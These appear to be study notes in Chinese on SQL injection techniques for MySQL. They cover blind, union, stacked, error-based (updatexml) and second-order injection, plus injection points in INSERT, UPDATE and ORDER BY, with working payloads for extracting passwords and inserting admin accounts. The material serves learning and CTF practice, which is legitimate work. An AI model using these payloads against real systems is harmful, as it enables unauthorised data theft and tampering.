```
SELECT * FROM `emp`
#1、判断是数字型注入还是字符型注入
#语句一和语句二相等，语句三和语句四不等  可以通过这个方法来判断是字符型还是数字型注入
SELECT * FROM emp WHERE id = 1; #语句一
SELECT * FROM emp WHERE id = 3-2; #语句二
SELECT * FROM emp WHERE id = '1'; #语句三
SELECT * FROM emp WHERE id = '3-1'; #语句四

#2、闭合方法
#注释闭合
SELECT * FROM emp WHERE id = '2'#';
#除了注释，也可以用单引号进行闭合 1'AND '1 字符串'1'被强制转换为true 
SELECT * FROM emp WHERE id = '1' AND '1' UNION (SELECT * FROM emp);

#字符串类型会被强制转换为整型，故相等（TRUE为1 FALSE为0）
SELECT '1' = 1,'1a' = 1,TRUE,FALSE,'a'= 0;
#3、union联合注入
SELECT * FROM emp WHERE id = 1 UNION (SELECT * FROM emp);

#4、布尔盲注
SELECT '1' AND 'a';#为假
SELECT * FROM emp WHERE id = '1' AND 'a';  #输出为空
#猜测数据
#f为被猜测的字符，a为猜测的字符
SELECT * FROM emp WHERE id = '1' AND 'f '= 'a';
#不断尝试，直到尝试到f，则可以得到数据
#方法：二分查找或者bp爆破
SELECT * FROM emp WHERE id = '1' AND 'f '= 'f';
#尝试使用布尔注入获得idcard
#SELECT idcard FROM emp WHERE id = ''; 在单引号中开始sql注入
#payload => 1' AND (SELECT MID((SELECT password FROM table_1 ),1,1)) = '1
SELECT `password` FROM table_1 WHERE id = '1' AND (SELECT MID((SELECT password FROM table_1 ),1,1)) = '1' ;
#第一位不是1 返回为空，即无回显
SELECT `password` FROM table_1 WHERE id = '1' AND (SELECT MID((SELECT password FROM table_1 ),1,1)) = '2' ;


#5、时间盲注 SELECT * FROM emp WHERE id = '  '; 
#payload =>  
SELECT * FROM emp WHERE id = '1' OR SLEEP(0.01) AND (SELECT MID((SELECT password FROM table_1 ),1,1)) = '1';  

#6、堆叠注入 SELECT password FROM table_1 WHERE id = ''; 在单引号中开始sql注入
#采用多语句的执行方式修改数据库的任意结构和数据，在闭合单引号后可以执行任意的sql语句
SELECT password FROM table_1 WHERE id = '1';SELECT * FROM table_1# ';
```



```
-- sql注入的注入点


-- SELECT ${_GET['id']} FROM TABLE_name
-- 利用AS别名的方法
SELECT (SELECT `password` FROM table_1 ) AS psw  FROM table_1;

-- 注入点在table_reference
-- SELECT password FROM ${_GET['id']};
-- 同样可以利用AS别名的方式注入
-- 假设 table_1 有以下数据：
-- id	name
-- 1	Alice
-- 2	Bob
-- 3	Charlie
-- 首先，内层查询 (SELECT id AS password FROM table_1) 会返回：
-- 
-- password
-- 1
-- 2
-- 3
-- 然后，外层查询从这个临时结果（别名为 x）中选择 password 列，最终结果会是：
-- 
-- password
-- 1
-- 2
-- 3
-- 把敏感信息重命名为title，则语句查询出来的title的内容就是我们需要的敏感信息
SELECT `title` FROM (SELECT `password` AS title  FROM table_1 )x;



-- 注入点在where或者having后，就是前面学习过的那些注入方法


-- 注入点在GROUP BY 或者 ORDER BY
SELECT `name` FROM emp GROUP BY id DESC,(IF(1,SLEEP(1),1));

-- INSERT注入
-- 注入点在table_name
-- INSERT INTO {$_GET['table']} VALUES ();
-- 即向表中插入了一条数据
-- 作用是可以插入一个新的管理员
INSERT INTO table_1 VALUES('root','123',2);VALUES('root1','1234',3);

-- 注入点在values
-- INSERT INTO table_1 VALUES (1,1,'可控位置')
-- 先闭合单引号,再插入记录,通过表字段控制管理员权限
-- 有时候也可以插入会回显的字段

-- 注入点在update 如文章更新等
-- 当id可控,可以更新多条数据
UPDATE table_1 SET id=5,`password`='54321'  WHERE username = 'monkey';

-- 注入点在delete一般使用sleep(1)确保表不会不小心被删除
SELECT SLEEP(1); -- FALSE


-- SELECT * FROM table_1 WHERE id = '  ';
-- payload =>  1\' AND title = 'OR SLEEP(1) #
SELECT * FROM table_1 WHERE id = '1\' AND title = 'OR SLEEP(1) #';
SELECT * FROM table_1 WHERE id = '1\' AND title = ' UNION SELECT * FROM table_1 #';

-- 二次注入原理
INSERT INTO table_1 SET VALUES (' admin\'or \'1 ','321',10); 
-- 这样username进入表中就变为 SELECT password FROM table_1 WHERE username = 'admin'or '1 '; 就有了注入点

```

```
报错注入
1、同样先判断注入点和注入类型
2、确定页面或者抓包是否会回显报错信息
3、构造payload，利用updatexml
updatexml(xml_doument,XPath_string,new_value)
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据

第一个参数：XML的内容
第二个参数：是需要update的位置XPATH路径
第三个参数：是更新后的内容
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式

例如：name=1' and updatexml(1,concat(0x7e,(seselectlect flag from note.fl4g),0x7e),1) --+
```


